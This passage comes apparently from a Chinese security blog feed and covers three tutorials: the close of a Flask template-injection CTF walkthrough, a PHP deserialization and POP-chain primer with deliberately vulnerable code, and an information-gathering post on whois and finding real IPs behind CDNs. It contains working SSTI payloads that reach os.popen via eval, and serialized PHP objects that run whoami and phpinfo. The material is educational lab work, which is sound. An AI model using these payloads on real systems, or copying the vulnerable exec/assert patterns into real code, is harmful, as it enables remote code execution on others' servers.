<p>请注意，这里面其实是python语言,因为我们要输入到url中执行，然后被flask解释渲染，所以就变成了这个样子，还原python代码，只需把其中的｛%%｝去掉就可以了，我们看大概的功能就是查找””字符串对象的一个引用的子类，如果这个子类中包含catch_warning模块，那么就能在进一步再去找到存在OS调用，或者存在eval等调用的模块，从而执行我们的命令。</p>
<p>在ctfdemo中的利用，这里我们一步一步构造payload不用上面的通杀利用方法，方便大家更好的理解漏洞利用原理</p>
<p>回归一开始那个CTF题，我们知道存在模板注入，那么我们第一步就要定位存在os模块的调用类，这边我了解到os一般会被</p>
<p>catch_warnings调用，那么我们先把其找出来，构造payload,这些都是我处理过的直接输入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个是列出来其基类中的所有子类</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008193714189.png" data-fancybox="group" data-caption="image-20211008193714189" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008193714189.png" alt="image-20211008193714189" title="image-20211008193714189"></a></p>
<p>发现catch_warnings</p>
<p>但是太乱太多了，怎么定位这个列表里面的下标啊，我们只需要构造以下代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">	&#123;&#123;[].__class__.__base__.__subclasses__().index(c)&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008195125635.png" data-fancybox="group" data-caption="image-20211008195125635" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008195125635.png" alt="image-20211008195125635" title="image-20211008195125635"></a></p>
<p>得到了下标59，我们继续向下利用。查看内置函数</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008195407184.png" data-fancybox="group" data-caption="image-20211008195407184" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008195407184.png" alt="image-20211008195407184" title="image-20211008195407184"></a></p>
<p>linecache中是存在OS调用的，我们可以继续构造查看,关于怎么找到对应的下标参考上面定下标的语法动手敲一敲吗！然后我们看到第13有一个<strong>builtins</strong></p>
<p>这个魔术方法我们说过，他能够执行python的一些内置函数的，那么我们就可以完成了啊，构造payload去执行命令</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008201117590.png" data-fancybox="group" data-caption="image-20211008201117590" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008201117590.png" alt="image-20211008201117590" title="image-20211008201117590"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008201146852.png" data-fancybox="group" data-caption="image-20211008201146852" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202110/image-20211008201146852.png" alt="image-20211008201146852" title="image-20211008201146852"></a></p>
<p>对于如何知道某个模块存在在那个类中，这个很难其实，这里仅仅是解出这一个题之后，我们把这个东西拆出来说的，但是在实际中利用，还是利用前面的那个通杀的脚本，来的实在，他会帮助我们找到对应的方法，自动定位执行。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>​        本次通过简单的说明了一下模版注入漏洞的成因，简单的fix一下，然后谈了谈其利用原理，以及利用方法，利用思想，最后利用一个CTF题来进行实际操作，其实不光是Py存在这种漏洞，大多数语言比如php，java等的框架也存在此类问题，其中利用方法也各有千秋，更深更广层次的利用还有待探究。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化的入门探索</title>
    <url>/2021/04/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="反序列化的入门学习探索"><a href="#反序列化的入门学习探索" class="headerlink" title="反序列化的入门学习探索"></a>反序列化的入门学习探索</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        反序列化漏洞可谓是大名鼎鼎了，关于各种web组件的反序列化漏洞也是层出不穷，php，java，python等都有反序列的问题，那么反序列化到底是怎么一回事呢？又应该如何利用呢，本文作为一个对于反序列化实践较少的小白，来做一个简单的尝试以及探索，经过了一些了解，我也发现了一个问题，就是目前php最近出的反序列化问题比较少，近年来主要还是Java多，weblogic，fastjson反序列化层出不穷，看样子还是java web开发主流啊，这些后面还有待深入的研究。</p>
<h2 id="1-什么是反序列化"><a href="#1-什么是反序列化" class="headerlink" title="1 什么是反序列化"></a>1 什么是反序列化</h2><p>​        要说起这个概念，我们就要聊一聊什么叫序列化了。为了方便数据传输与对于数据的处理，许多语言，比如Java就会把这些对象进行序列化，转化为字节流。反序列化呢，顾名思义就是将这些字节流还原为原来的东西，那么这里就又出现了一个问题了，对于一些用户的输入，如果程序进行了序列化反序列化处理，这里就存在网络安全我们最注重的一个原则，任何情况下不要相信用户的输入，这里用户可以精心构造一些代码，从而达到其目的，在还原为反序列化的过程中，这些代码就会被执行。</p>
<p>​    其实呢说白了，我们举一个通俗易懂的例子。比如说，我在网上买了一辆自行车，但是你给我发货直接发一辆车太麻烦，卖家呢就给我把自行车给拆了拆成很多的零件邮寄给我。这就是序列化。然后呢，我收到了自行车之后，我进行组装，把他还原成一辆自行车，这就是反序列化。在这个过程中呢，比如说自行车的生产商比较黑心（我们把这个理解为一个产生这个产品的人，即用户的输入），把好的零件换了一些劣质的，一用就坏，然后我反序列化结束后用这辆车的时候，刚骑出去两部，车轱辘就给飞了。这其实就可以理解为反序列化的危害的一个简单的过程。</p>
<p>​    </p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415161956683.png" data-fancybox="group" data-caption="image-20210415161956683" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415161956683.png" alt="image-20210415161956683" title="image-20210415161956683"></a></p>
<p>​    这是一个简单的图解，其实说归说，原理很简单，很容易，接下来呢，我们就来实践一下，目前而言，这些漏洞基本出现在一些比较流行的框架当中，所以说危害还是蛮大的，对于其代码审计，我们也要熟知可能造成危害的函数。</p>
<p>​    接下来我们以PHP为例子来说一下简单的反序列化。</p>
<h2 id="2-PHP反序列化的简单尝试"><a href="#2-PHP反序列化的简单尝试" class="headerlink" title="2 PHP反序列化的简单尝试"></a>2 PHP反序列化的简单尝试</h2><p>​    当然了，我们说学习漏洞就得写出来个漏洞自己先看看吗</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string serialize ( mixed $value )   <span class="comment">#PHP的序列化函数</span></span><br><span class="line">mixed unserialize ( string $str )   <span class="comment">#PHP的反序列化函数</span></span><br></pre></td></tr></table></figure></div>

<p>我们现在先来看一看序列化的代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $t1 = <span class="string">"A"</span>;</span><br><span class="line">	<span class="keyword">var</span> $t2 = <span class="string">"B"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();   <span class="comment">//建立一个对象</span></span><br><span class="line">$b = serialize($a); <span class="comment">//对于对象进行反序列化输出</span></span><br><span class="line">print_r($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415173938993.png" data-fancybox="group" data-caption="image-20210415173938993" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415173938993.png" alt="image-20210415173938993" title="image-20210415173938993"></a></p>
<p>我们得到了序列化的结果。对于这些什么O啊，数字啊，什么意思这里是他的一些解释</p>
<p> a - array 数组  b - boolean布尔型  d - double双精度型    i - integer o - common object一般对象  r - reference s - string C - custom object 自定义对象 O - class N - null R - pointer reference U - unicode string unicode编码的字符串</p>
<p>我们输的的内容的意思是  自定义对象O 长度4  名字叫Test 里面的内容 字符类型类型 名字的长度为2 t1 然后变量类型字符 长度为1 内容为A 以此类推</p>
<p>我们在来看一下反序列化</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $t1 = <span class="string">"A"</span>;</span><br><span class="line">	<span class="keyword">var</span> $t2 = <span class="string">"B"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">print_r($b);</span><br><span class="line">$c= unserialize($b);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">print_r($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里我们输出了反序列化的结果。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415174228688.png" data-fancybox="group" data-caption="image-20210415174228688" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415174228688.png" alt="image-20210415174228688" title="image-20210415174228688"></a></p>
<p>那么要怎么利用呢？</p>
<p>​    我们就要说一下一些PHP的魔术方法了，学过Python的朋友们也应该知道，是一系列内置的特殊方法多以_开头。我们常说的构造函数（对象被创建时运行），析构函数（对象被销毁时运行）的方法也是魔术方法。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常用魔术方法</span></span><br><span class="line"></span><br><span class="line">__construct()：<span class="comment">//构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span></span><br><span class="line"></span><br><span class="line">__destruct()：<span class="comment">//析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。</span></span><br><span class="line"></span><br><span class="line">__wakeup()：<span class="comment">//调用unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。该方法用于分配资源</span></span><br><span class="line"></span><br><span class="line">__toString():<span class="comment">//用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。</span></span><br><span class="line"></span><br><span class="line">__sleep():<span class="comment">//用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。</span></span><br></pre></td></tr></table></figure></div>

<p>​    我们看这些方法都是出发在一个对象创建或者销毁的时候，在对对象进行序列化与反序列化的过程中，就是对象创建销毁的一个过程，所以可以触发，能够利用这些魔术方法，触发我们的恶意代码。</p>
<p>接下来是我们简单的一个存在PHP反序列化的漏洞代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">"phpinfo()"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> exec(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = $_GET[<span class="string">'test'</span>];</span><br><span class="line">$t = unserialize($test); <span class="comment">// 反序列化同时触发_destruct函数</span></span><br></pre></td></tr></table></figure></div>

<p>在这里我们构造payload  </p>
<p>O:1:”A”:1:{s:4:”test”;s:6:”whoami”;}</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415191411045.png" data-fancybox="group" data-caption="image-20210415191411045" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210415191411045.png" alt="image-20210415191411045" title="image-20210415191411045"></a></p>
<p>浏览器输入，成功执行！</p>
<h2 id="3-对于反序列化漏洞的一些思考（POP链的简单实践）"><a href="#3-对于反序列化漏洞的一些思考（POP链的简单实践）" class="headerlink" title="3 对于反序列化漏洞的一些思考（POP链的简单实践）"></a>3 对于反序列化漏洞的一些思考（POP链的简单实践）</h2><p>​        既然我们学习了反序列化那么我们以后肯定要应用到实战里面去，那么对于反序列化漏洞的挖掘以及反序列化漏洞我们应该防范那应该有何注意的呢。通过剖析反序列化漏洞的原理我们知道，产生于用户的输入，在对于用户的输入在应用中进行序列与反序列化时出触发了魔术方法，进而导致了漏洞的产生。对此构造序列化的payload是十分重要的，但是这里又产生了以个问题，数据的格式我们很难猜测，一般我们只能通过代码审计等找到这些漏洞。但是呢，传统的web应用不管是框架还是一些程序，当然不可能跟本文中的例子一样，直接给你弄出来了，这么简单的漏洞代码，都需要我们进行深入的跟进，对于一个输入，跟踪这个输入，一步一步的看应用如何处理该输入，从而构造特定的payload进而实现利用。这一个传递过程我们称之为pop链。</p>
<p><strong>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</strong></p>
<p>此处我们举一个简单的POP链例子</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">t1</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test1;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;test1 = <span class="keyword">new</span> t2();		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;test1-&gt;demo();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">t2</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"这里可没有问题哦！"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">t3</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test2;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		assert(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> t1();</span><br><span class="line">unserialize($_GET[<span class="string">"payload"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>以上代码是我们简单举例的一个POP链的简单利用。</p>
<p>​    首先分析一下思路，我们先抛开类不谈，先看看我们可控的参数，这个例子中payload使我们可控的。然后这个参数被带到反序列化对象里面可以利用，前面已经产生了t1的一个对象，我们可以对t1进行反序列化利用。</p>
<p>​    转到t1中我们发现有两个魔术方法，一个构造函数，当产生t1时也同时创建一个t2。在销毁t1的时候，我们在执行本来应该正常执行的t2里面的demo函数。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416180542257.png" data-fancybox="group" data-caption="image-20210416180542257" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416180542257.png" alt="image-20210416180542257" title="image-20210416180542257"></a></p>
<p>​    这时候呢一个坏家伙审计代码，发现了一个问题 t3里面也有一个叫demo的函数，而且里面还有危险的assert函数，可以执行代码。这时候，我们就可以经过特殊的构造从而执行t3里面的demo函数。那么我们可不可以这样构造呢，我们这时候呢修改t1中构造方法时候创建的t2类，我们用一个t3类的内容替换t2类，从而在触发t1的析构函数的时候，执行的是t3中的demo而不是t2的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416181321537.png" data-fancybox="group" data-caption="image-20210416181321537" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416181321537.png" alt="image-20210416181321537" title="image-20210416181321537"></a></p>
<p>接下来使我们的payload生成，我们这里输出phpinfo</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">t1</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test1;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;test1 = <span class="keyword">new</span> t3();</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">t3</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test2 =<span class="string">"phpinfo()"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> t1());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416181504192.png" data-fancybox="group" data-caption="image-20210416181504192" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416181504192.png" alt="image-20210416181504192" title="image-20210416181504192"></a></p>
<p>带入其中</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416181522226.png" data-fancybox="group" data-caption="image-20210416181522226" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210416181522226.png" alt="image-20210416181522226" title="image-20210416181522226"></a></p>
<p>执行成功，成功弹出phpinfo（）</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB安全回顾小记---信息搜集篇</title>
    <url>/2021/04/07/WEB%E5%AE%89%E5%85%A8%E5%9B%9E%E9%A1%BE%E5%B0%8F%E8%AE%B0---%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AF%87/</url>
    <content><![CDATA[<h1 id="WEB安全回顾小记—信息搜集篇"><a href="#WEB安全回顾小记—信息搜集篇" class="headerlink" title="WEB安全回顾小记—信息搜集篇"></a>WEB安全回顾小记—信息搜集篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    大家好啊，我是青花，这里呢很久没有碰网络安全技术了，随着考研的结束，也可以继续有时间去投入到这个行业中去了，但是从前的好多东西大概两年没有碰了吧，这里呢，我打算以标准的渗透测试流程来为期半个月左右的实践来回顾一下从前的知识命令。</p>
<p>​    这里呢，我应用到了两个靶场，其实是两个虚拟机，这个我们大家应该都比较明白，这两个虚拟机大家都应该听说过，一个是 Metasploitable2还有一个是Owaspbwa（获取方式这里就不提了，百度先行），除此之外，我们还应用到了Kali linux以及一些大佬们的工具（虽然我不太赞成上来就用工具，因为工具不是万能的，至少我们应该了解工具原理有时间自己用Python等根据实际情况具体问题具体分析是最好的，毕竟只会用工具不懂原理不动脑子，就成了脚本小子了）。这些都能够帮助我们很好地学习，毕竟入门来说还是很棒的，没有授权乱去搞网站也不太好，容易出事。</p>
<p>​    除此之外，不涉及域渗透内容，因为资源有限只有一个个人的PC机，当年在学校没有好好利用资源，学习域渗透的知识，这些也都是后面我们在商讨的问题了，接下来我们就来先从最基本的信息搜集说起吧！</p>
<p>​    我用的书是一本偏实战的书，这本书很赞。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407221114801.png" data-fancybox="group" data-caption="image-20210407221114801" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407221114801.png" alt="image-20210407221114801" title="image-20210407221114801"></a></p>
<p>但我文章我会尽量往入门写，我比较喜欢以通俗易懂的方式去表达一些概念原理，。入门书籍当时是看了三本书，两本国人的COS的web前端黑客技术揭秘还有一本道哥的白帽子讲web安全这些了解了基本的web原理，在深入看了一些专门讲sql注入还有xss的书，还有一本国外的具体名字不记得了，记得是一本蓝色的书。由于时间太久其中很多都忘记了，这里慢慢回忆一些。</p>
<h2 id="1-为啥要信息搜集踩点以及搜集的一些渠道"><a href="#1-为啥要信息搜集踩点以及搜集的一些渠道" class="headerlink" title="1 为啥要信息搜集踩点以及搜集的一些渠道"></a>1 为啥要信息搜集踩点以及搜集的一些渠道</h2><p>​    这里最先谈的当然是信息搜集，我国自古就有知己知彼，百战不殆的说法，当然在渗透测试web安全的战场也是如此。信息搜集是主要的，信息搜集能够帮助我们在后面更加方面的对系统进行攻击，以及查漏补缺。信息搜集其实可以分为被动信息搜索与主动信息搜索，其实区分这两个概念十分简单，被动搜索就是不直接接触对方系统去扫描啊，扫网段啊，这种，主动信息搜集就是我们主动上扫描器。</p>
<p>​    首先聊一聊信息搜集的几个渠道，其实这门学问很有意思，其中还有很多是明令禁止的内容，诸如社会工程学这种，以及人肉等东西，这些都是违法的，还是希望大家不要乱用技术去做违法的事（注：本文只是针对只言片语来聊一聊，不做任何用途，任何做其他用途造成的后果由造成个人承担）。这些搜集渠道很广泛，我们可以通过whois查网站的信息，然后横向展开，也可以namp来扫描网站所在服务器所在端口服务系统等情况或者用御剑啥的爆目录以及子域名挖掘，也可以用傻蛋，以及zoomeye来找一找在其网段中的设备，当然天下没有不透风的墙，在我们搜集信息的过程中，总会或多或少的发现其中存在的一些问题，信息搜集阶段是至关重要的，毕竟我们在这个阶段可以对目标的资产做一个搜集，以及对于目标系统结构有一个大概的了解，然后通过这些信息构建下一步的计划。</p>
<p>​    我们这里来简单的做一些简单的说明来看一看这些都能给我们带来什么</p>
<h3 id="1-1-whois（基本的域名主体信息的搜罗）"><a href="#1-1-whois（基本的域名主体信息的搜罗）" class="headerlink" title="1.1 whois（基本的域名主体信息的搜罗）"></a>1.1 whois（基本的域名主体信息的搜罗）</h3><p>​    其实呢whois就是一个对于域名注册信息的信息库，我们在注册我们的域名的时候，我们常常会被要求提供一下个人的信息，比如说电话，邮箱这些东西，whois就是一个将这些信息集合起来的数据库，其实我觉得初衷可能是为了给大家抢注域名用的，叫大家看看这个域名有没有被注册啥的，这东西其实也有点坑，有一些厂商，我也就不提了，懂得都懂，在注册域名的时候，问你需不需要一个域名的保密服务，意思就是whois之后出不来你的个人信息，这种还需要另外收费的，其实我觉得保障用户隐私不是最基本的吗，这玩意居然还被单提令拿出来收钱，也是叫人笑笑。但是后来这也成了信息泄露的一个渠道，就像高校的各大QQ群里面或多或少会泄露一些信息。</p>
<p>​    国内的whois给我的感觉信息是不全的，因为一些政策原因吗，很多都被屏蔽掉了，建议还是去国外的一些whois比较好一些，信息也比较全面。这里呢，我们用百度来做一个例子。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407225604843.png" data-fancybox="group" data-caption="image-20210407225604843" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407225604843.png" alt="image-20210407225604843" title="image-20210407225604843"></a></p>
<p>国内最多就到这个状态了，我们看看国外，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407225904569.png" data-fancybox="group" data-caption="image-20210407225904569" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407225904569.png" alt="image-20210407225904569" title="image-20210407225904569"></a></p>
<p>我们看会多出很多信息，而且很详细。</p>
<p>​    其实吧，我觉得whois这些东西是比较敏感的，这些东西主要跟社会工程学结合紧密，通过对于一个站点个人信息的搜集有的时候可能会对我们的测试过程带来意想不到的结果。</p>
<h3 id="1-2-ping（发觉服务器真实IP）"><a href="#1-2-ping（发觉服务器真实IP）" class="headerlink" title="1.2 ping（发觉服务器真实IP）"></a>1.2 ping（发觉服务器真实IP）</h3><p>​    说到这里，你可能大吃一惊。Ping?也能做信息搜集吗？这里我们不是说信息搜集，Ping命令当然在大多时候我们都是用来测试网络的连通性用的，但是这里我们可以协助利用找出来我们所要攻击的目标所在服务器的IP地址。这里你可能还会问，服务器IP还不好找，直接DNS一查不就出来了吗。当然你说的没错，但是我们可能找到的不是真正的服务器IP呢？那就是另外的一回事了。啥？服务器IP还能有假，当然，在今天CDN服务流行的今天，CDN不光能够提升用户的体验，还能够隐藏真实服务器的IP地址，带来一定的安全性。</p>
<p>​    对于CDN服务，这里简单说一下，就是比如我们访问在美国的一个视频网站，这个网站呢，我们从我们中国大陆到美国，这要经历很长的链路，虽然网络传输速度快，但是传输过程中的不确定性，使得这个过程可能会很漫长，这就会极大地影响了用户的体验，这时候呢，就出现了一些厂商，跟这家公司说，我在日本有节点，我可以提供服务，请你把你的内容部署在我这里，我替你做一个节点，提供更快的速度帮助中国的用户，就这样，我们每次在此访问这个视频网站，该系统就会寻找离我们最近的一个CDN节点来使用其内容，比如此例，就会转向日本的节点，虽然距离也不短，但是会也大大的减少了传输距离，用户的体验无非是会提高的。</p>
<p>​    基于以上CDN，就会导致我们访问的不是一个真实的服务器地址，常见的解决办法是利用多地Ping，来看看这个网站有没有挂CDN，如你所想如果他挂了CDN那我们在不同地点就会得到不同的服务器IP地址。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407231552643.png" data-fancybox="group" data-caption="image-20210407231552643" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407231552643.png" alt="image-20210407231552643" title="image-20210407231552643"></a></p>
<p>我们看，单纯的在我国进行多地Ping baidu.com就会有很多不同的结果。</p>
<p>​    这些IP有的可能一个IP开了许多WEB服务在不同的端口，这时候我们确认就可以用IP反差服务，这也是网络上基于域名备案信息的一个数据库，我们可以从中看一看一个IP上绑了多少域名。</p>
